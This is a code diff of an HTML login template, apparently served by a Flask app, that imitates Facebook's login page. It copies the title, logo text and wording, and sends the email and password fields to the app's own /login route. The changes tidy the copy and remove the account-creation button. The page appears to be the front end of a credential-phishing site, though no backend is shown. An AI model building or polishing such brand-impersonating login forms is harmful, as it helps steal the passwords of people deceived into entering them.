@@ -2,19 +2,17 @@
 <html>
 <head>
   <title>Facebook – log in or sign up</title>
-  <link rel="stylesheet" href="/static/style.css">
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
-  <div class="login-box">
+  <div class="fb-container">
     <h1>facebook</h1>
-    <form method="POST">
-      <input type="text" name="email" placeholder="Email address or phone number" required>
+    <form method="POST" action="/login">
+      <input type="text" name="email" placeholder="Email or phone number" required>
       <input type="password" name="password" placeholder="Password" required>
       <button type="submit">Log In</button>
     </form>
-    <a class="forgot" href="#">Forgotten password?</a>
-    <hr>
-    <button class="create-btn">Create New Account</button>
+    <a href="#">Forgotten password?</a>
   </div>
 </body>
 </html>
